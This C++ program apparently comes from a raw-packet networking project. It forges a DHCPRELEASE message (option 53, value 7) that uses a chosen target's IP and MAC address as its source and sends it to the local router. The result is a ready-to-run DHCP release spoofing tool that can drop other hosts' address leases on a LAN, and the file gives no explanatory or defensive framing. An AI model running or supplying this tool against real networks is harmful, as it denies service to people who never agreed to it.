#include <iostream>

#include <cstring>
#include <memory>
#include <netinet/in.h>
#include <stdio.h>

#include <pcapwrapper/controller.hpp>
#include <pcapwrapper/helpers/helper.h>
#include <pcapwrapper/interfaces/interface.h>
#include <pcapwrapper/processors/processorempty.h>

#include <pcapwrapper/helpers/helper.h>
#include <pcapwrapper/network/sniff/sniffethernet.h>
#include <pcapwrapper/network/sniff/sniffip.h>
#include <pcapwrapper/network/sniff/sniffudp.h>

#include "dhcpbuilder.h"
#include "dhcpframe.h"
#include "dhcpoption.h"

template <typename T>
bool setIp(unsigned char *ip, const T &ip_value, int base) {
    std::array<unsigned char, ip_addr_len> array;
    bool successful =
        PCAP::PCAPHelper::split_string<unsigned char, ip_addr_len>(
            ip_value, '.', array, base);
    if (successful) {
        memcpy(ip, array.data(), ip_addr_len);
    }
    return successful;
}

template <typename T>
bool setMac(unsigned char *addr, const T &ethernet_value, int base) {
    std::array<unsigned char, ethernet_addr_len> array;
    bool sucessful =
        PCAP::PCAPHelper::split_string<unsigned char, ethernet_addr_len>(
            ethernet_value, ':', array, base);
    if (sucessful) {
        memcpy(addr, array.data(), ethernet_addr_len);
    }
    return sucessful;
}

PCAP::sniffethernet create_ethernet(const std::string &src_mac,
                                    const std::string &dst_mac) {
    PCAP::sniffethernet ethernet;
    setMac(ethernet.m_ether_dhost, dst_mac, 16);
    setMac(ethernet.m_ether_shost, src_mac, 16);
    ethernet.m_ether_type = htons(0x0800);
    return ethernet;
}

PCAP::sniffip create_ip(const std::string &src_ip, const std::string &dst_ip) {
    PCAP::sniffip ip;
    ip.m_ip_vhl = 0x45;
    ip.m_ip_tos = 0x00;
    ip.m_ip_len = htons(0x0014); // 20
    ip.m_ip_id = htons(0x0000);
    ip.m_ip_off = htons(0x4000);
    ip.m_ip_ttl = 0x40;
    ip.m_ip_p = 0x11;
    ip.m_ip_sum = htons(0x0000);
    setIp(ip.m_ip_src, src_ip, 10);
    setIp(ip.m_ip_dst, dst_ip, 10);
    return ip;
}

PCAP::sniffudp create_udp(unsigned short src_port, unsigned short dst_port) {
    PCAP::sniffudp udp;
    udp.m_th_sport = htons(src_port);
    udp.m_th_dport = htons(dst_port);
    udp.m_length = htons(0x0008);
    udp.m_checksum = htons(0x0000);
    return udp;
}

sniffdhcp create_dhcp(const std::string &target_ip,
                      const std::string &target_mac) {
    sniffdhcp dhcp;
    dhcp.m_op = 0x01;
    dhcp.m_type = 0x01;
    dhcp.m_hlen = 0x06;
    dhcp.m_hops = 0x00;
    dhcp.m_transaction = htonl(0xfc093241);
    dhcp.m_secs = htons(0x0000);
    dhcp.m_flags = htons(0x0000);
    setIp(dhcp.m_ciaddr, target_ip, 10);
    setIp(dhcp.m_yiaddr, "0.0.0.0", 10);
    setIp(dhcp.m_siaddr, "0.0.0.0", 10);
    setIp(dhcp.m_giaddr, "0.0.0.0", 10);
    setMac(dhcp.m_chaddr, target_mac, 16);
    return dhcp;
}

std::array<unsigned char, 4> create_magic_cookie() {
    return std::array<unsigned char, 4>{0x63, 0x82, 0x53, 0x63};
}

std::array<unsigned char, 6> create_host_name() {
    return std::array<unsigned char, 6>{0x0c, 0x04, 0x68, 0x6c, 0x69, 0x6e};
}

std::array<unsigned char, 1> create_end() {
    return std::array<unsigned char, 1>{0xFF};
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        std::cout << "1. Interface\n";
        std::cout << "2. Target\n";
        return 0;
    }

    std::string interface_name = argv[1];
    const auto target_ip = PCAP::IpAddress(argv[2]);
    const auto local_ip = PCAP::PCAPHelper::get_ip(interface_name);
    const auto router_ip = PCAP::PCAPHelper::get_router_ip(interface_name);
    const auto router_mac = PCAP::PCAPHelper::get_mac(router_ip, interface_name);
    const auto target_mac =
        local_ip == target_ip
            ? PCAP::PCAPHelper::get_mac(interface_name)
            : PCAP::PCAPHelper::get_mac(target_ip, interface_name);

    auto controller = std::make_shared<
        PCAP::Controller<PCAP::Interface, PCAP::ProcessorEmpty>>(
        interface_name);
    DHCPBuilder builder;
    builder << create_ethernet(target_mac.to_string(), router_mac.to_string());
    builder << create_ip(target_ip.to_string(), router_ip.to_string());
    builder << create_udp(68, 67);
    builder << create_dhcp(target_ip.to_string(), target_mac.to_string());
    builder << create_magic_cookie();
    builder << DHCPOption<1>(53, {7}).get_array();
    builder << create_end();
    builder.build();
    controller->write(builder.get_package(), builder.get_length());

    return 0;
}
